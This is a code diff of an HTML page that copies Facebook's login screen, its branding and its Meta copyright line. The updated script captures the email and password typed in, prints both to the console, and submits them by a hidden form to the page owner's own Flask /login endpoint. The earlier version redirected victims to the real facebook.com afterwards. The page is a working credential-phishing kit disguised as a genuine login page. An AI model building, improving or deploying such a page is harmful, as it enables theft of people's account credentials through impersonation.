@@ -5,289 +5,274 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>Facebook Login</title>
     <link rel="preconnect" href="https://fonts.gstatic.com">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/style.css">
     <style type="text/css">
         * {
-    padding: 0;
-    margin: 0;
-    box-sizing: border-box;
-}
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
 
-body {
-    font-family: 'Poppins', sans-serif;
-    background-color: #f0f2f5;
-    color: #1c1e21;
-}
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
 
-main {
-    height: 100vh;
-    width: 100vw;
-    position: relative;
-    margin: 0 auto;
-}
+        main {
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            margin: 0;
+            padding: 5px;
+        }
 
-footer {
-    height: 30vh;
-    background-color: #ffffff;
-}
+        .container {
+            display: flex;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            gap: 0;
+        }
 
-.row {
-    display: flex;
-    justify-content: space-around;
-    align-items: center;
-    width: 100%;
-    max-width: 1000px;
-    position: absolute;
-    left: 50%;
-    top: 50%;
-    transform: translate(-50%, -50%);
-}
+        .left-section {
+            flex: 0 0 60%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
 
-.col-logo {
-    flex: 0 0 50%;
-    text-align: left;
-}
+        .left-section img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
 
-.col-form {
-    flex: 0 0 40%;
-    text-align: center;
-}
+        .right-section {
+            flex: 0 0 40%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f2f5;
+            padding: 40px;
+            overflow-y: auto;
+        }
 
-.col-logo img {
-    max-width: 300px;
-}
+        .form-header {
+            text-align: left;
+            margin-bottom: 24px;
+            width: 100%;
+            max-width: 420px;
+        }
 
-.col-logo h2 {
-    font: 26px;
-    font-weight: 400;
-    padding: 0 30px;
-    line-height: 32px;
-}
+        .form-header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 10px;
+        }
 
-.col-form .form-container {
-    background-color: #ffffff;
-    border: none;
-    border-radius: 8px;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-    margin-bottom: 30px;
-    padding: 20px;
-    max-width: 400px;
-}
+        .form-container {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 420px;
+        }
 
-.col-form .form-container input, .col-form .form-container .btn-login {
-    width: 100%;
-    margin: 5px 0;
-    height: 45px;
-    vertical-align: middle;
-    font-size: 16px;
-}
+        .form-group {
+            margin-bottom: 16px;
+        }
 
-.col-form .form-container input {
-    border: 1px solid #dddfe2;
-    color: #1d2129;
-    padding: 0 8px;
-    outline: none;
-}
+        .form-container input {
+            width: 100%;
+            padding: 14px 16px;
+            height: auto;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #1d2129;
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
 
-.col-form .form-container input:focus {
-    border-color: #1877f2;
-    box-shadow: 0 0 0 2px #e7f3ff;
-}
+        .form-container input::placeholder {
+            color: #65676b;
+        }
 
-.col-form .form-container .btn-login {
-    background-color: #1877f2;
-    border: none;
-    border-radius: 6px;
-    font-size: 20px;
-    padding: 0 16px;
-    color: #ffffff;
-    font-weight: 700;
-}
+        .form-container input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
 
-.col-form .form-container a {
-    display: block;
-    color: #1877f2;
-    font-size: 14px;
-    text-decoration: none;
-    padding: 10px 0 20px;
-    border-bottom: 1px solid #dadde1;
-}
+        .btn-login {
+            width: 100%;
+            padding: 11px 16px;
+            height: 45px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #ffffff;
+            background-color: #0a66c2;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 12px;
+        }
 
-.col-form .form-container a:hover {
-    text-decoration: underline;
-}
+        .btn-login:hover {
+            background-color: #165ec7;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
 
-.col-form .form-container .btn-new {
-    background-color: #42b72a;
-    border: none;
-    border-radius: 6px;
-    font-size: 17px;
-    line-height: 48px;
-    padding: 0 16px;
-    color: #ffffff;
-    font-weight: 700;
-    margin-top: 20px;
-}
+        .btn-login:active {
+            transform: scale(0.98);
+        }
 
-.col-form p {
-    font-size: 14px;
-}
+        .form-container a {
+            display: block;
+            color: #0a66c2;
+            font-size: 14px;
+            text-decoration: none;
+            padding: 14px 0;
+            text-align: center;
+            transition: color 0.2s ease;
+            border-bottom: 1px solid #dddfe2;
+        }
 
-.col-form p a {
-    text-decoration: none;
-    color: #1c1e21;
-    font-weight: 600;
-}
+        .form-container a:hover {
+            text-decoration: underline;
+            color: #165ec7;
+        }
 
-.col-form p a:hover {
-    text-decoration: underline;
-}
+        .btn-new {
+            width: 100%;
+            padding: 11px 16px;
+            height: 45px;
+            border: 2px solid #e4e6eb;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #0a66c2;
+            background-color: #ffffff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 16px;
+            font-family: 'Poppins', sans-serif;
+        }
 
-.footer-contents {
-    position: relative;
-    max-width: 1000px;
-    margin: 0 auto;
-}
+        .btn-new:hover {
+            background-color: #f5f6f7;
+            border-color: #0a66c2;
+        }
 
-footer ol {
-    display: flex;
-    flex-wrap: wrap;
-    list-style-type: none;
-    padding: 10px 0;
-}
+        .btn-new:active {
+            transform: scale(0.98);
+        }
 
-footer ol:first-child {
-    border-bottom: 1px solid #dddfe2;
-}
+        .form-footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #65676b;
+        }
 
-footer ol:first-child li:last-child button {
-    background-color: #f5f6f7;
-    border: 1px solid #ccd0d5;
-    outline: none;
-    color: #4b4f56;
-    padding: 0 8px;
-    font-weight: 700;
-    font-size: 16px;
-}
+        .form-footer a {
+            color: #0a66c2;
+            text-decoration: none;
+            border: none;
+            padding: 0;
+            display: inline;
+        }
 
-footer ol li {
-    padding-right: 15px;
-    font-size: 12px;
-    color: #385898;
-}
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
 
-footer ol li a {
-    text-decoration: none;
-    color: #385898;
-}
+        .meta-footer {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 13px;
+            color: #65676b;
+        }
 
-footer ol li a:hover {
-    text-decoration: underline;
-}
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .container {
+                flex-direction: column;
+                gap: 40px;
+            }
 
-footer small {
-    font-size: 11px;
-}
+            .left-section {
+                order: 2;
+                max-width: 400px;
+            }
 
-.col-form .form-container .btn-login:hover {
-    cursor: pointer;
-}
+            .right-section {
+                order: 1;
+            }
 
-    </style> 
-    
-    <script>
-        // function login() {
-        //     // Add your login logic here
-        //     // For example, you can redirect the user to a login page or perform some authentication process
-        //     // You can also use libraries like jQuery or frameworks like Angular or React for more complex interactions
-        //     alert("Login button clicked!"); // This is just a placeholder action
-        // }
-    </script>
+            main {
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .form-header h1 {
+                font-size: 24px;
+            }
+
+            .form-container {
+                padding: 20px;
+            }
+
+            .container {
+                gap: 20px;
+            }
+        }
+    </style>
 
 </head>
 
 <body>
     <main>
-        <div class="row">
-            <div class="col-logo">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
-                <h2>Connect with friends and the world around you on Facebook.</h2>
+        <div class="container">
+            <div class="left-section">
+                <img src="fb1.png" alt="Facebook experience">
             </div>
-            <div class="col-form">
-                <div class="form-container">
-                    <input type="text" id="email" placeholder="Email or phone number">
-                    <input type="password" id="password" placeholder="Password">
-                    <button class="btn-login" onclick="login()">Login</button>
-                    <a href="#">Forgotten password?</a>
-                    <button class="btn-new">Create new Account</button>
+            <div class="right-section">
+                <div class="form-header">
+                    <h1>Log into Facebook</h1>
                 </div>
-                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+                <div class="form-container">
+                    <div class="form-group">
+                        <input type="text" id="email" placeholder="Email or mobile number">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password">
+                    </div>
+                    <button class="btn-login" onclick="login()">Log in</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create new account</button>
+                </div>
+                <div class="form-footer">
+                    <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+                </div>
+                <div class="meta-footer">
+                    <p>© Meta 2024</p>
+                </div>
             </div>
         </div>
     </main>
-    <footer>
-        <div class="footer-contents">
-            <ol>
-                <li>English (UK)</li>
-                <li><a href="#">മലയാളം</a></li>
-                <li><a href="#">தமிழ்</a></li>
-                <li><a href="#">తెలుగు</a></li>
-                <li><a href="#">বাংলা</a></li>
-                <li><a href="#">اردو</a></li>
-                <li><a href="#">हिन्दी</a></li>
-                <li><a href="#">ಕನ್ನಡ</a></li>
-                <li><a href="#">Español</a></li>
-                <li><a href="#">Português (Brasil)</a></li>
-                <li><a href="#">Français (France)</a></li>
-                <li><button>+</button></li>
-            </ol>
 
-            <ol>
-                <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log In </a></li>
-                <li><a href="#">Messenger</a></li>
-                <li><a href="#">Facebook Lite</a></li>
-                <li><a href="#">Watch</a></li>
-                <li><a href="#">People</a></li>
-                <li><a href="#">Pages</a></li>
-                <li><a href="#">Page categories</a></li>
-                <li><a href="#">Places</a></li>
-                <li><a href="#">Games</a></li>
-                <li><a href="#">Locations</a></li>
-                <li><a href="#">Marketplace</a></li>
-                <li><a href="#">Facebook</a></li>
-                <li><a href="#">PayGroups</a></li>
-                <li><a href="#">Jobs</a></li>
-                <li><a href="#">Oculus</a></li>
-                <li><a href="#">Portal</a></li>
-                <li><a href="#">Instagram</a></li>
-                <li><a href="#">Local</a></li>
-                <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log In </a></li>
-                <li><a href="#">Messenger</a></li>
-                <li><a href="#">Facebook Lite</a></li>
-                <li><a href="#">Watch</a></li>
-                <li><a href="#">People</a></li>
-                <li><a href="#">Pages</a></li>
-                <li><a href="#">Page categories</a></li>
-                <li><a href="#">Places</a></li>
-                <li><a href="#">Games</a></li>
-                <li><a href="#">Locations</a></li>
-                <li><a href="#">Marketplace</a></li>
-                <li><a href="#">Facebook</a></li>
-                <li><a href="#">PayGroups</a></li>
-                <li><a href="#">Jobs</a></li>
-                <li><a href="#">Oculus</a></li>
-                <li><a href="#">Portal</a></li>
-                <li><a href="#">Instagram</a></li>
-                <li><a href="#">Local</a></li>
-            </ol>
-            <small>Meta © 2023</small>
-        </div>
-    </footer>
     <script>
         function login() {
             console.log('Login Function called');
@@ -295,21 +280,35 @@ footer small {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Save user credentials (this is just a sample)
-            var credentials = {
-                email: email,
-                password: password
-            };
+            // Basic validation
+            if (!email || !password) {
+                alert('Please enter both email/phone and password');
+                return;
+            }
 
-            
-            // display the captured data in the console
-            //not displaying. fix error later
-            console.log("Email: " + credentials.email);
-            console.log("Password: " + credentials.password);
+            // Display the captured data in the console
+            console.log("Email: " + email);
+            console.log("Password: " + password);
 
-            // Redirect to Facebook.com or any of your choice
-            // window.location.href = "https://www.tradingview.com";
-            window.location.href = "https://www.facebook.com";
+            // Create a form and POST credentials to Flask /login endpoint
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/login';
+
+            var emailField = document.createElement('input');
+            emailField.type = 'hidden';
+            emailField.name = 'email';
+            emailField.value = email;
+            form.appendChild(emailField);
+
+            var passwordField = document.createElement('input');
+            passwordField.type = 'hidden';
+            passwordField.name = 'password';
+            passwordField.value = password;
+            form.appendChild(passwordField);
+
+            document.body.appendChild(form);
+            form.submit();
         }
     </script>
 </body>
